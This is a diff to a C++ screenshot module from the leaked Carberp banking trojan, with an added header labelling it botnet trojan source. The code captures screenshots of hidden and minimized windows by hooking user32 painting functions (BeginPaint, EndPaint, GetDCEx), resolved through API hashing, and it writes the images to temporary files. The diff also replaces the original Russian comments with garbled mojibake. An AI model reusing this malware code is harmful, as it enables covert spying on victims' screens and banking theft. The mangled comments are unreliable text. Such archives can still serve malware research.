@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #include "ScreenShots.h"
@@ -37,7 +48,7 @@ static void SaveScreenShotToPng( HBITMAP bmp, PWCHAR FileName )
 
 void ScreenShotDrawCursor(HDC DC, int ImgX, int ImgY, PDrawCursorInfo DrawCursor)
 {
-	// Функция отрисовывает курсор на скриншоте
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	RECT R;
 
 	int W2 = DrawCursor->PointWidth / 2;
@@ -66,11 +77,11 @@ bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 
 	static const GUID png = {0x557cf406,0x1a04,0x11d3,{0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e}};
 
-	// Получаем контекст окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	HDC DC = (HDC)pGetWindowDC(Wnd);
 	if (DC == NULL) return false;
 
-	// Получаем границы окна
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	RECT Rect;
     ClearStruct(Rect);
 	if (Wnd != NULL)
@@ -87,13 +98,13 @@ bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 	if (Height == 0)
 		Height = Rect.bottom - Rect.top;
 
-	// Отрисовываем окно
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	HBITMAP Bitmap = (HBITMAP)pCreateCompatibleBitmap(DC, Width, Height);
 	HDC CompDC = (HDC)pCreateCompatibleDC(DC);
 	pSelectObject(CompDC, Bitmap);
 	pBitBlt(CompDC, 0, 0, Width, Height, DC, X , Y, SRCCOPY);
 
-	// Отрисовываем курсор
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //    HCURSOR hArrow=(HCURSOR)pLoadCursorW(NULL,IDC_ARROW);
 //
 //    ICONINFO iconinfo={0};
@@ -101,7 +112,7 @@ bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 //    pDrawIcon(hCompDC,SSHOT_WIDTH/2-iconinfo.xHotspot,SSHOT_HEIGHT/2-iconinfo.yHotspot,hArrow);
 //    pDeleteObject(hArrow);
 
-	// Рисуем надпись
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //    rect.top=0;
 //    rect.right=0;
 //    rect.left=SSHOT_WIDTH;
@@ -110,7 +121,7 @@ bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 //    pSetBkColor(hCompDC,0xFFFFFF);
 //    pDrawTextA(hCompDC,lpUrl,-1,&rect,DT_BOTTOM+DT_SINGLELINE+DT_CENTER);
 
-	// Отрисовываем курсор
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (DrawCursor != NULL)
 		ScreenShotDrawCursor(CompDC, X, Y, DrawCursor);
 
@@ -118,7 +129,7 @@ bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 	pDeleteDC(CompDC);
 
 
-    // Сохраняем картинку в файл
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	SaveScreenShotToPng( Bitmap, FileName );
 
 	pDeleteObject(Bitmap);
@@ -143,7 +154,7 @@ bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 //---------------------------------------------------------------------------
 
 //------------------------------------------------------
-//  CaptureScreen - Функция делает скриншот экрана
+//  CaptureScreen - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 bool ScreenShot::CaptureScreenA(PCHAR  FileName)
 {
@@ -166,7 +177,7 @@ bool ScreenShot::MakeToMem(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 	PWCHAR FileName = GetTempName();
 	if (FileName == NULL) return false;
 
-	// Делаем снимок
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = Make(Wnd, X, Y, Width, Height, DrawCursor, FileName);
 	if (Result)
 	{
@@ -174,7 +185,7 @@ bool ScreenShot::MakeToMem(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
 		Result = OutDataSize != 0;
     }
 
-	// Удаляем временный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     pDeleteFileW(FileName);
 	MemFree(FileName);
 	return true;
@@ -193,7 +204,7 @@ void DbgMsg(const char *format, ...)
 */
 
 /******************************************************************************************************/
-// Методы скриншота скрытых окон
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 typedef HDC (WINAPI* typeBeginPaint)( HWND hwnd, LPPAINTSTRUCT lpPaint );
 typedef BOOL (WINAPI* typeEndPaint)( HWND hWnd, CONST PAINTSTRUCT *lpPaint );
@@ -213,7 +224,7 @@ static RECT wndRect;
 
 //static int abcd = 0;
 
-//для сохранения параметров между вызовов BeginPaint и EndPaint
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BeginPaint пїЅ EndPaint
 struct DCScrShot
 {
 	HWND wnd;
@@ -225,7 +236,7 @@ struct DCScrShot
 const int MaxDCSaved = 20;
 static DCScrShot* dcSaved = 0;
 
-//находит сохраненные параметры для окна или дает свободную ячейку (wnd == 0)
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (wnd == 0)
 DCScrShot* GetSavedDC( HWND wnd )
 {
 	for( int i = 0; i < MaxDCSaved; i++ )
@@ -234,7 +245,7 @@ DCScrShot* GetSavedDC( HWND wnd )
 	return 0;
 }
 
-//определяет экранные координаты клиентской области
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void GetScreenClientRect( HWND wnd, RECT* r )
 {
 	pGetClientRect( wnd, r );
@@ -248,7 +259,7 @@ static void GetScreenClientRect( HWND wnd, RECT* r )
 	r->bottom += p.y;
 }
 
-//рисует контекст котрола на контексте где делаем скриншот, NC - для неклиентской области
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, NC - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void DrawSavedDC( bool NC, HWND wnd, HDC dc, int x, int y, int w, int h )
 {
 	RECT r;
@@ -261,7 +272,7 @@ static void DrawSavedDC( bool NC, HWND wnd, HDC dc, int x, int y, int w, int h )
 
 static void FillBackground( HWND hWnd, HDC dc )
 {
-	HBRUSH brush = (HBRUSH)pGetClassLongA( hWnd, GCL_HBRBACKGROUND ); //цвет фона
+	HBRUSH brush = (HBRUSH)pGetClassLongA( hWnd, GCL_HBRBACKGROUND ); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	RECT r;
 	pGetWindowRect( hWnd, &r );
 	r.right -= r.left;
@@ -271,18 +282,18 @@ static void FillBackground( HWND hWnd, HDC dc )
 	pFillRect( dc, &r, brush );
 }
 
-//перехват функции BeginPaint
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BeginPaint
 static HDC WINAPI HookBeginPaint( HWND hwnd, LPPAINTSTRUCT lpPaint )
 {
 	HDC dc = Real_BeginPaint( hwnd, lpPaint );
-	if( dcScreenShot ) //в режиме скриншота
+	if( dcScreenShot ) //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
-		DCScrShot* dss = GetSavedDC(0); //ищем свободную ячейку
+		DCScrShot* dss = GetSavedDC(0); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if( dss )
 		{
-			dss->wnd = hwnd; //сохраняем параметры
+			dss->wnd = hwnd; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			dss->dcOriginal = dc;
-			dss->dc = (HDC)pCreateCompatibleDC(dc); //создаем новое контекстное устройство
+			dss->dc = (HDC)pCreateCompatibleDC(dc); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pGetClientRect( hwnd, &lpPaint->rcPaint );
 			int h = lpPaint->rcPaint.bottom - lpPaint->rcPaint.top;
 			int w = lpPaint->rcPaint.right - lpPaint->rcPaint.left;
@@ -292,23 +303,23 @@ static HDC WINAPI HookBeginPaint( HWND hwnd, LPPAINTSTRUCT lpPaint )
 			RECT r;
 			GetScreenClientRect( hwnd, &r );
 			BitBlt( dss->dc, 0, 0, w, h, dcScreenShot, r.left - wndRect.left, r.top - wndRect.top, SRCCOPY );
-			lpPaint->hdc = dss->dc; //подменяем на наше
+			lpPaint->hdc = dss->dc; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 		}
 	}
 	return lpPaint->hdc;
 }
 
-//перехват окончания обработки события WM_PAINT
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ WM_PAINT
 static BOOL WINAPI HookEndPaint( HWND hWnd, CONST PAINTSTRUCT *lpPaint )
 {
 	if( dcScreenShot )
 	{
-		DCScrShot* dss = GetSavedDC(hWnd); //ищем сохраненную ячейку
+		DCScrShot* dss = GetSavedDC(hWnd); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if( dss )
 		{ 
 			int h = lpPaint->rcPaint.bottom - lpPaint->rcPaint.top;
 			int w = lpPaint->rcPaint.right - lpPaint->rcPaint.left;
-			//перебрасываем то что нарисовал процесс в наш контекст
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			DrawSavedDC( false, hWnd, lpPaint->hdc, lpPaint->rcPaint.left, lpPaint->rcPaint.top, w, h );
 			((PAINTSTRUCT*)lpPaint)->hdc = dss->dcOriginal;
 			HBITMAP bmp = (HBITMAP) pSelectObject( dss->dc, dss->oldBmp );
@@ -328,23 +339,23 @@ static BOOL WINAPI HookEndPaint( HWND hWnd, CONST PAINTSTRUCT *lpPaint )
 	return Real_EndPaint( hWnd, lpPaint );
 }
 
-//перехватываем для обработки события WM_NCPAINT
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ WM_NCPAINT
 static HDC WINAPI HookGetDCEx( HWND hWnd, HRGN hrgnClip, DWORD flags )
 {
 	if( dcScreenShot )
 	{
-		if( hWnd ==	wndScreenShot ) //рисуется не клиентская область основного окна
+		if( hWnd ==	wndScreenShot ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		{
 			return dcScreenShot;
 		}
 		else
 		{
-			DCScrShot* dss = GetSavedDC(0); //ищем свободную ячейку
+			DCScrShot* dss = GetSavedDC(0); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if( dss )
 			{
-				dss->wnd = hWnd; //сохраняем параметры
+				dss->wnd = hWnd; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				HDC dc = (HDC)pGetDC(hWnd);
-				dss->dc = (HDC)pCreateCompatibleDC(dc); //создаем новое контекстное устройство
+				dss->dc = (HDC)pCreateCompatibleDC(dc); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				RECT r;
 				pGetWindowRect( hWnd, &r );
 				int h = r.bottom - r.top;
@@ -360,20 +371,20 @@ static HDC WINAPI HookGetDCEx( HWND hWnd, HRGN hrgnClip, DWORD flags )
 	return Real_GetDCEx( hWnd, hrgnClip, flags );
 }
 
-//Посылаем события дочерним окнам, чтобы перерисовались на нашем контексте
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
 	if( pIsWindowVisible(hwnd) )
 	{
 		pSendMessageA( hwnd, WM_NCPAINT, WPARAM(1), 0 );
-		DCScrShot* dss = GetSavedDC(hwnd); //ищем сохраненную ячейку
+		DCScrShot* dss = GetSavedDC(hwnd); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if( dss ) 
 		{ 
 			RECT r;
 			pGetWindowRect( hwnd, &r );
 			int h = r.bottom - r.top;
 			int w = r.right - r.left;
-			//перебрасываем то что нарисовал процесс в наш контекст
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			DrawSavedDC( true, hwnd, dss->dc, 0, 0, w, h );
 			HBITMAP bmp = (HBITMAP) pSelectObject( dss->dc, dss->oldBmp );
 			/*
@@ -391,13 +402,13 @@ static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 	return TRUE;
 }
  
-//управляющая функция для снятия скриншота с скрытого окна
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 bool ScreenShot::DrawWindow( HWND Wnd, PWCHAR FileName )
 {
 	//pSendMessageA( Wnd, WM_NCACTIVATE, true, NULL );
-	//формируем контекст на котором будет рисоваться скриншот
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     HDC dcMem = (HDC)pCreateCompatibleDC(NULL);
-	if( pIsIconic(Wnd) ) //если окно свернуто, то его размеры определяем другим способом
+	if( pIsIconic(Wnd) ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		WINDOWPLACEMENT wp;
 		wp.length = sizeof(wp);
@@ -410,31 +421,31 @@ bool ScreenShot::DrawWindow( HWND Wnd, PWCHAR FileName )
 	else
 		pGetWindowRect( Wnd, &wndRect);
     HDC dc = (HDC)pGetDC(Wnd);
-    HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, wndRect.right - wndRect.left, wndRect.bottom - wndRect.top ); //в этом bitmap будет наш скриншот
+    HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, wndRect.right - wndRect.left, wndRect.bottom - wndRect.top ); //пїЅ пїЅпїЅпїЅпїЅ bitmap пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     pReleaseDC( Wnd, dc );
 
     HGDIOBJ old = pSelectObject( dcMem, bmp );
 
-	//инициализация переменных
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	wndScreenShot = Wnd; 
 	dcScreenShot = dcMem;
 	dcSaved = (DCScrShot*)HEAP::Alloc( sizeof(DCScrShot) * MaxDCSaved );
 
-	//заполняем фоном основное окно
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	FillBackground( Wnd, dcMem );
 
-	//хукаем
+	//пїЅпїЅпїЅпїЅпїЅпїЅ
 	if( !HookApi( DLL_USER32, Hash_BeginPaint, HookBeginPaint, &Real_BeginPaint ) ) return false;
 	if( !HookApi( DLL_USER32, Hash_EndPaint, HookEndPaint, &Real_EndPaint ) ) return false;
 	if( !HookApi( DLL_USER32, Hash_GetDCEx, HookGetDCEx, &Real_GetDCEx ) ) return false;
 
-	//посылка события основному окну
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pSendMessageA( Wnd, WM_NCPAINT, WPARAM(1), 0 );
 	pSendMessageA( Wnd, WM_PAINT, 0, 0 );
-	//Отсылка событий дочерним окнам
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	pEnumChildWindows( Wnd, EnumChildProc, 0 );
 
-	//освобождаем ресурсы
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	wndScreenShot = 0;
 	dcScreenShot = 0;
 	HEAP::Free(dcSaved);
@@ -459,7 +470,7 @@ bool ScreenShot::DrawWindow(HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize)
 	PWCHAR FileName = GetTempName();
 	if (FileName == NULL) return false;
 
-	// Делаем снимок
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = DrawWindow( Wnd, FileName );
 	if (Result)
 	{
@@ -467,7 +478,7 @@ bool ScreenShot::DrawWindow(HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize)
 		Result = OutDataSize != 0;
     }
 
-	// Удаляем временный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     pDeleteFileW(FileName);
 	MemFree(FileName);
 	return true;
@@ -476,12 +487,12 @@ bool ScreenShot::DrawWindow(HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize)
 bool ScreenShot::DrawWindow2( HWND Wnd, PWCHAR FileName )
 {
 	pSendMessageA( Wnd, WM_NCACTIVATE, true, NULL );
-	//формируем контекст на котором будет рисоваться скриншот
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     HDC dcMem = (HDC)pCreateCompatibleDC(NULL);
 	RECT r;
     pGetWindowRect( Wnd, &r);
     HDC dc = (HDC)pGetDC(Wnd);
-    HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, r.right - r.left, r.bottom - r.top ); //в этом bitmap будет наш скриншот
+    HBITMAP bmp = (HBITMAP)pCreateCompatibleBitmap( dc, r.right - r.left, r.bottom - r.top ); //пїЅ пїЅпїЅпїЅпїЅ bitmap пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     pReleaseDC( Wnd, dc );
     HGDIOBJ old = pSelectObject( dcMem, bmp );
 
@@ -505,7 +516,7 @@ bool ScreenShot::DrawWindow2(HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize)
 	PWCHAR FileName = GetTempName();
 	if (FileName == NULL) return false;
 
-	// Делаем снимок
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = DrawWindow2( Wnd, FileName );
 	if (Result)
 	{
@@ -513,7 +524,7 @@ bool ScreenShot::DrawWindow2(HWND Wnd, LPBYTE &OutData, DWORD &OutDataSize)
 		Result = OutDataSize != 0;
     }
 
-	// Удаляем временный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     pDeleteFileW(FileName);
 	MemFree(FileName);
 	return true;
